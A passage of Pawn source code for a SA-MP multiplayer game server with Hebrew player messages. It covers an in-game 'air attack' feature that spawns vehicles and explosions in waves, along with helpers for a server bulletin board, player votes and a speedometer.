AirAttackV[playerid][189] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][190] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+140.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 17;
return true;
}

return true;
}

else if(Stateaa[playerid] == 17)
{

if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][64] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][65] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][66] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][67] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 18;
return true;
}

else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][96] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][97] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][98] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][99] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][100] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][101] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 18;

return true;
}

else if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][191] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][192] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][193] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][194] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][195] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][196] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][197] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][198] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][199] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][201] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][202] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][203] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+160.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 18;

return true;
}

return true;
}

else if(Stateaa[playerid] == 18)
{

if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][204] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][205] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][206] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][207] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][208] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][209] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][210] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][211] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][212] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][222] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][223] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][224] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);

SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 19;
return true;
}


else if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][64] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][65] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][66] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][67] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 19;
return true;
}


else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][102] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][103] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][104] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][105] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][106] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][107] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+200.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SetTimerEx("DestroyAirAttack",350,0,"i",playerid);
Stateaa[playerid] = 19;
return true;
}

return true;
}


else if(Stateaa[playerid] == 19)
{

if(AsLevel[playerid] == 3)
{
AirAttackV[playerid][225] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][226] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][227] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][228] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][229] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][230] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][231] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][232] =  CreateVehicle(425, AirAttack[playerid][0]+60.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][233] =  CreateVehicle(432, AirAttack[playerid][0],AirAttack[playerid][1]+260.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][234] =  CreateVehicle(432, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][235] =  CreateVehicle(432, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackV[playerid][236] =  CreateVehicle(432, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2], 0.0, 0, 6, -1000);
AirAttackOn[playerid] = 0;
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA3) - המתקפת אווירית הסתיימה בהצלחה");

KillTimer(KillTimeraa[playerid]);
for(new i=0; i<VAS; i++)
{
DestroyVehicle(AirAttackV[playerid][i]);
}
SetTimerEx("ResetTheVar",1000,0,"i",playerid);
return true;
}

else if(AsLevel[playerid] == 1)
{
AirAttackV[playerid][64] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][65] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][66] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][67] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA1) - המתקפת אווירית הסתיימה בהצלחה");
AirAttackOn[playerid] = 0;
KillTimer(KillTimeraa[playerid]);
for(new i=0; i<VAS; i++)
{
DestroyVehicle(AirAttackV[playerid][i]);
}
SetTimerEx("ResetTheVar",1000,0,"i",playerid);
return true;
}


else if(AsLevel[playerid] == 2)
{
AirAttackV[playerid][108] =  CreateVehicle(520, AirAttack[playerid][0],AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][109] =  CreateVehicle(425, AirAttack[playerid][0]+10.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][110] =  CreateVehicle(520, AirAttack[playerid][0]+20.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][111] =  CreateVehicle(425, AirAttack[playerid][0]+30.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1000);
AirAttackV[playerid][112] =  CreateVehicle(520, AirAttack[playerid][0]+40.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
AirAttackV[playerid][123] =  CreateVehicle(520, AirAttack[playerid][0]+50.0,AirAttack[playerid][1]+260.0,AirAttack[playerid][2]+ZAA, 0.0, 0, 6, -1);
SendClientMessage(playerid,COLOR_LIGHTGREEN,"(Air Attack - AA2) - המתקפת אווירית הסתיימה בהצלחה");
AirAttackOn[playerid] = 0;
KillTimer(KillTimeraa[playerid]);
for(new i=0; i<VAS; i++)
{
DestroyVehicle(AirAttackV[playerid][i]);
}
SetTimerEx("ResetTheVar",1000,0,"i",playerid);
return true;
}
}





return true;
}


public DestroyAirAttack(playerid)
{
for(new i=0; i<VAS; i++)
{
DestroyVehicle(AirAttackV[playerid][i]);
}
return true;
}


public LaunchZone(playerid)
{

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],5,5);

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],1,1);

CreateExplosion(AirAttack[playerid][0]+45.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+50.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+55.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+60.0,AirAttack[playerid][1],AirAttack[playerid][2],5,5);
CreateExplosion(AirAttack[playerid][0]+70,AirAttack[playerid][1],AirAttack[playerid][2],5,5);

CreateExplosion(AirAttack[playerid][0]+76.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+80.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+90.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+100.0,AirAttack[playerid][1],AirAttack[playerid][2],1,1);
CreateExplosion(AirAttack[playerid][0]+105,AirAttack[playerid][1],AirAttack[playerid][2],1,1);

return true;
}


public LaunchZone2(playerid)
{
CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],8,8);

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],3,3);

CreateExplosion(AirAttack[playerid][0]+76.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+80.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+90.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+100.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+105,AirAttack[playerid][1],AirAttack[playerid][2],8,8);

SetTimerEx("LaunchZone3",1500,0,"i",playerid);
return true;
}

public LaunchZone3(playerid)
{

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],8,8);

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],3,3);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],3,3);

CreateExplosion(AirAttack[playerid][0]+76.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+80.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+90.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+100.0,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
CreateExplosion(AirAttack[playerid][0]+105,AirAttack[playerid][1],AirAttack[playerid][2],8,8);
return true;
}

public LaunchZone4(playerid)
{
CreateExplosion(AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+3.3,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+4.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]-10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-35.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-83.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-73.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-63.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-60.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-50.130,AirAttack[playerid][1],AirAttack[playerid][2],10,10);


CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]+83.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+73.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+63.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+60.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+50.130,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

SetTimerEx("LaunchZone5",1500,0,"i",playerid);
return true;
}

public LaunchZone5(playerid)
{
CreateExplosion(AirAttack[playerid][0],AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+3.3,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+4.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]-10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-35.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-83.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-73.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-63.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-60.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]-50.130,AirAttack[playerid][1],AirAttack[playerid][2],10,10);


CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]+10.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+20.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+25.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+30.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+35,AirAttack[playerid][1],AirAttack[playerid][2],10,10);

CreateExplosion(AirAttack[playerid][0]+83.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+73.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+63.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+60.0,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
CreateExplosion(AirAttack[playerid][0]+50.130,AirAttack[playerid][1],AirAttack[playerid][2],10,10);
return true;
}

public ResetTheVar(playerid)
{
KillTimer(KillTimeraa[playerid]);
AirAttack[playerid][0] = 0.0;
AirAttack[playerid][1] = 0.0;
AirAttack[playerid][2] = 0.0;
AirAttackOn[playerid] = 0;
Stateaa[playerid] = 0;
AsLevel[playerid] = 0;
return true;
}

public bbshow()
{

new n = random(MAX_WANGEXPORTVEHICLES);


wantedWangExportVehicle = wantedWangExportVehicles[n];



new Global_BB[256];
SendClientMessageToAll(lblue,":לוח מודעות");
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message1"));
SendClientMessageToAll(COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message2"));
SendClientMessageToAll(COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message3"));
SendClientMessageToAll(COLOR_YELLOW,Global_BB);
format(Global_BB,sizeof(Global_BB),"%s",dini_Get(bbplace,"Message4"));
SendClientMessageToAll(COLOR_YELLOW,Global_BB);
format(Global_BB, sizeof(Global_BB),"(5) - !%s's מוסך וואנג מחפש את הרכב", wantedWangExportVehicleNames[n]);
SendClientMessageToAll(COLOR_YELLOW, Global_BB);



return true;
}






stock CreateVehicleEx(modelid,Float:x,Float:y,Float:z,Float:a,color1,color2,respawn_delay,interior,world)
{
 assert modelid >= 400 || modelid <= 611;
 new v = CreateVehicle(modelid,x,y,z,a,color1,color2,respawn_delay);
 LinkVehicleToInterior(v,interior);
 SetVehicleVirtualWorld(v,world);
 return 1;
}

stock SendPlayerBotMessage(playerid,color_bot,bot_name[],message[],bot_type)
{

new Save_Name[200][24]; new Save_Color[200]; new string[256];
Save_Name[playerid] = GetName(playerid);
Save_Color[playerid] = GetPlayerColor(playerid);
SetPlayerColor(playerid,color_bot);
format(string,sizeof(string),"%s",bot_name);
SetPlayerName(playerid,string);
if(bot_type == 1) SendPlayerMessageToAll(playerid,message);

SetPlayerColor(playerid,Save_Color[playerid]);
SetPlayerName(playerid,Save_Name[playerid]);
return true;
}

forward public resetsoon_hitman(playerid);
public resetsoon_hitman(playerid) return aDoingSoon[playerid] = 0;
//forward public reset_bot();
//public reset_bot() return bot_can_send_message = 0;

stock online_players_update()
{
new string[256]; count_online = 0;
for(new i = 0; i < GetMaxPlayers(); i++)
{
if(IsPlayerConnected( i )) count_online ++;
}
format(string,sizeof(string),"%d",count_online);
SetServerRule("online players",string);
}


//=[vote_state]========
forward public vote_state();
public vote_state()
{

new vote_string[256];
SendClientMessageToAll(COLOR_LIGHTGREEN,":הסקר הסתיים בהצלחה! תוצאות");
format(vote_string,sizeof(vote_string),"%d :הצבעות חיוביות",vote[1]);
SendClientMessageToAll(COLOR_LIGHTGREEN,vote_string);
format(vote_string,sizeof(vote_string),"%d :הצבעות שליליות",vote[2]);
SendClientMessageToAll(COLOR_LIGHTGREEN,vote_string);
format(vote_string,sizeof(vote_string),"(\"%s\")",quis);
SendClientMessageToAll(red,vote_string);

quis = "nope"; vote[0] = 0; vote[1] = 0; vote[2] = 0; vote[3] = 0;
for(new i = 0; i < GetMaxPlayers(); i++)
{
vote_player[i] = 0;
}
return true;
}

///=[Speedo]=================================================================
public CheckStatus()
{
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(IsPlayerInAnyVehicle(i))
			{

	      if(dini_Int(GetPlayerFile(i),"SpeedoOn") == 1)
	      {

				if(TextDrawsShown[i] == false)
				{
